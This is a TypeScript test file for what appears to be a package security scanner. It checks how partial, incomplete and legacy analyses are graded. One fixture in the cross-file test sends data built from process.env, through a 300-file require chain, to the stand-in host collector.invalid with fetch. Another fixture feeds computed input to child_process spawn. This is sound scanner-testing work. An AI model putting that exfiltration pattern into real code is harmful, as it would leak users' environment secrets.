// How much of a version apm read, as the install verdict and the grade read it (readingOf), fail-closed (review of
// c456c92). Only whole files left unread for their size or the byte budget, on the current scorer's record and with
// nothing else unfinished, is a partial reading graded P; every other gap is incomplete and keeps the letter its score
// earns. A whole-flow stop is `incomplete`, as it always was, and its evidence names the stop (review of 120efc2:
// no signal id of its own, so production's parser still reads the report).
import { describe, expect, test } from "bun:test";
import { analyze, finalize, parseAnalysis, PREVIOUS_SCORER, readingOf, riskSignalsIn, SCORER, storedAnalysis, unfinishedAnalysis, type Analysis, type AnalyzeInput, type TarEntry } from "../src/index.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;
const MANIFEST = { name: "probe-pkg", version: "1.0.0", main: "index.js", license: "MIT" };

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function analysisOf(files: Record<string, string>, extra: Partial<AnalyzeInput> = {}): Analysis {
  return analyze({ name: MANIFEST.name, manifest: MANIFEST, files: [entry("package.json", JSON.stringify(MANIFEST)), ...Object.entries(files).map(([p, t]) => entry(p, t))], publisher: "fake", previousPublishers: [], ...extra });
}

const ids = (a: Analysis): string[] => a.signals.map((s) => s.id);
const BIG = { "index.js": "module.exports = 1;\n", "big.js": `module.exports = "${"x".repeat(200)}";\n` };

describe("readingOf and the grade", () => {
  test("a file past the byte budget and nothing else: partial, graded P", () => {
    const a = analysisOf(BIG, { maxScannedBytes: 64 });

    expect(a.coverage).toMatchObject({ kind: "partial", reasons: ["over-budget"] });
    expect(readingOf(a).kind).toBe("partial");
    expect(finalize(a, STATE).grade).toBe("P");
  });

  test("a complete reading is complete, and an earlier scorer's with no coverage stored is too", () => {
    const a = analysisOf({ "index.js": "module.exports = 1;\n" });
    const { coverage: _coverage, ...rest } = a;
    const v10: Analysis = { ...rest, scorer: PREVIOUS_SCORER };

    expect(readingOf(a).kind).toBe("complete");
    expect(readingOf(v10).kind).toBe("complete");
  });

  // review of c456c92, finding 2: the reduced retry is incomplete beside its byte-budget omission
  test("a reduced retry with a file past the budget: incomplete, graded by its score, never P", () => {
    const a = analysisOf(BIG, { maxScannedBytes: 64, incompleteBecause: ["2 earlier analyses of this version were stopped by the platform before they stored anything, so this one read at most 4 MB"] });

    expect(readingOf(a).kind).toBe("incomplete");
    expect(finalize(a, STATE).grade).toBe("F");
  });

  // review of c456c92, finding 4: a stopped analysis was P, a parser limit a letter; both are incomplete and lettered
  test("the work meter out (coverage stopped) and a parser limit (coverage complete): incomplete, graded F", () => {
    const stopped = unfinishedAnalysis({ name: MANIFEST.name, manifest: MANIFEST, files: [entry("index.js", "1")], phase: "score", limit: 100 });
    const deep = analysisOf({ "index.js": `module.exports = ${"(".repeat(5000)}1${")".repeat(5000)};\n` });

    expect(stopped.coverage).toMatchObject({ kind: "partial", reasons: ["stopped"] });
    expect(deep.coverage).toEqual({ kind: "complete" });

    for (const a of [stopped, deep]) {
      expect(ids(a)).toContain("incomplete");
      expect(readingOf(a).kind).toBe("incomplete");
      expect(finalize(a, STATE).grade).toBe("F");
    }
  });

  test("a partial reading another scorer recorded, or one of the current scorer's with no coverage or no reasons, is incomplete", () => {
    const a = analysisOf(BIG, { maxScannedBytes: 64 });
    const partial = a.coverage?.kind === "partial" ? a.coverage : null;

    expect(partial).not.toBeNull();
    expect(readingOf({ ...a, scorer: PREVIOUS_SCORER } satisfies Analysis).kind).toBe("incomplete");
    expect(readingOf({ scorer: SCORER, signals: a.signals }).kind).toBe("incomplete");

    if (partial) expect(readingOf({ ...a, coverage: { ...partial, reasons: [] } }).kind).toBe("incomplete");
    expect(finalize({ ...a, scorer: PREVIOUS_SCORER } satisfies Analysis, STATE).grade).not.toBe("P");
  });

  // review of 120efc2, finding 1: the registry's warnings word each kind of incomplete reading from `why`
  test("an incomplete reading says why: the signal, an earlier scorer's gap, no coverage record, or coverage off the allowlist", () => {
    const a = analysisOf(BIG, { maxScannedBytes: 64 });
    const partial = a.coverage?.kind === "partial" ? a.coverage : null;
    const gap = { id: "unanalyzed-files" as const, label: "x", points: -20, evidence: [], confidence: "confirmed" as const };

    expect(readingOf(analysisOf({ "index.js": "0;".repeat(240_001) }))).toEqual({ kind: "incomplete", why: "signal" });
    expect(readingOf({ scorer: PREVIOUS_SCORER, signals: [gap] })).toEqual({ kind: "incomplete", why: "legacy-gap" });
    expect(readingOf({ scorer: SCORER, signals: [] })).toEqual({ kind: "incomplete", why: "no-coverage" });

    if (partial) expect(readingOf({ ...a, scorer: PREVIOUS_SCORER })).toEqual({ kind: "incomplete", why: "coverage", coverage: partial });
  });

  // review of c456c92, finding 3: a package published on apm keeps its stored report, read as it is
  test("a stored apm-score-v11 report, incomplete with no flow stop recorded, stays incomplete when read as stored", () => {
    const stored = storedAnalysis(analysisOf({ "index.js": "0;".repeat(240_001) }));

    expect(stored).not.toBeNull();

    if (stored) {
      expect(ids(stored)).toEqual(["incomplete"]);
      expect(readingOf(stored).kind).toBe("incomplete");
    }
  });
});

describe("a whole-flow stop is incomplete, and its evidence names the stop", () => {
  /** test/bounded.test.ts's budget fixture: labels multiply with every level until the flow reading's budget. */
  function imported(helpers: number, levels: number): string {
    const vars = Array.from({ length: helpers }, (_, i) => `v${i}`);
    const lines = ["import {spawn} from 'node:child_process';", ...vars.map((_, i) => `import {m${i}} from './m${i}.js';`)];

    lines.push(`const s0=(${vars.join(",")})=>({${vars.map((v, i) => `${v}:m${i}(${v})`).join(",")}});`);

    for (let i = 1; i < levels; i++) {
      const renamed = vars.map((v) => `${v}:w${v}`).join(",");
      const passed = vars.map((v, j) => `m${j}(${v},${vars[(j + 1) % helpers] ?? v})`).join(",");

      lines.push(`const s${i}=(${vars.join(",")})=>{const {${renamed}}=s${i - 1}(${passed});return s${i - 1}(${vars.map((v) => `w${v}`).join(",")})};`);
    }

    lines.push(`export const run=(a)=>spawn(s${levels - 1}(${vars.map(() => "a").join(",")}));`);

    return lines.join("\n");
  }

  const helpers = Object.fromEntries(Array.from({ length: 8 }, (_, i) => [`m${i}.js`, `export const m${i}=(a,b)=>[a,b];`]));

  test("a file's flow reading at its work budget", () => {
    const a = analysisOf({ "index.js": imported(8, 5), ...helpers });

    const incomplete = a.signals.find((s) => s.id === "incomplete");

    expect(ids(a)[0]).toBe("incomplete");
    expect(incomplete?.points).toBe(-61);
    expect(incomplete?.evidence[0]).toBe("index.js: apm could not finish tracing where values go in this file");
    expect(readingOf(a)).toEqual({ kind: "incomplete", why: "signal" });
  }, 60_000);

  test("the cross-file reading at its budget", () => {
    const link = (i: number, n: number): string => `module.exports=[${i + 1 === n ? "process.env" : `require('./f${i + 1}.js')`}];`;
    const files = Object.fromEntries([["index.js", "fetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(require('./f0.js'))});"], ...Array.from({ length: 300 }, (_, i) => [`f${i}.js`, link(i, 300)])]);
    const a = analysisOf(files, { maxCrossFileSteps: 50 });

    const incomplete = a.signals.find((s) => s.id === "incomplete");

    expect(incomplete?.evidence[0]).toBe("flows across files: apm could not finish tracing where values go between the files");
    expect(incomplete?.evidence).toContain(`flows across files: stopped at the work budget (50 steps), so values one file gives another were not all followed`);
  });

  test("a parser limit is incomplete, with no stop line: it holds on incomplete alone", () => {
    const a = analysisOf({ "index.js": "0;".repeat(240_001) });

    expect(ids(a)).toEqual(["incomplete"]);
    expect(a.signals[0]?.evidence.some((e) => e.includes("could not finish tracing"))).toBe(false);
  });
});

// apm-score-v12 ships in two deploys: first a build that still writes v11 and reads v12, then the build that writes it,
// so a rollback from the second lands on a build whose parser reads every report it wrote (production-parser.test.ts)
describe("a report apm-score-v12 writes, read by this build", () => {
  /** `a` as a v12 registry stores it (as JSON), parsed by this build. */
  const asV12 = (a: Omit<Analysis, "coverage"> & Partial<Pick<Analysis, "coverage">>): Analysis | null => parseAnalysis(JSON.parse(JSON.stringify({ ...a, scorer: "apm-score-v12" })));

  test("parses, keeps its scorer, and reads its coverage as v12 states it", () => {
    const partial = asV12(analysisOf(BIG, { maxScannedBytes: 64 }));
    const complete = asV12(analysisOf({ "index.js": "module.exports = 1;\n" }));

    expect(partial?.scorer).toBe("apm-score-v12");
    expect(partial === null ? null : readingOf(partial).kind).toBe("partial");
    expect(partial === null ? null : finalize(partial, STATE).grade).toBe("P");
    expect(complete === null ? null : readingOf(complete).kind).toBe("complete");
  });

  test("with no coverage record it is incomplete, as v11's own would be", () => {
    const { coverage: _coverage, ...rest } = analysisOf({ "index.js": "module.exports = 1;\n" });
    const parsed = asV12(rest);

    expect(parsed === null ? null : readingOf(parsed)).toEqual({ kind: "incomplete", why: "no-coverage" });
  });

  test("its risk signals count as risks, and v9's credential-access does not come back for it", () => {
    const report = { scorer: "apm-score-v12", signals: [{ id: "remote-shell", points: -50 }, { id: "credential-access", points: -20 }] };

    expect(riskSignalsIn(report).map((s) => s.id)).toEqual(["remote-shell"]);
  });
});
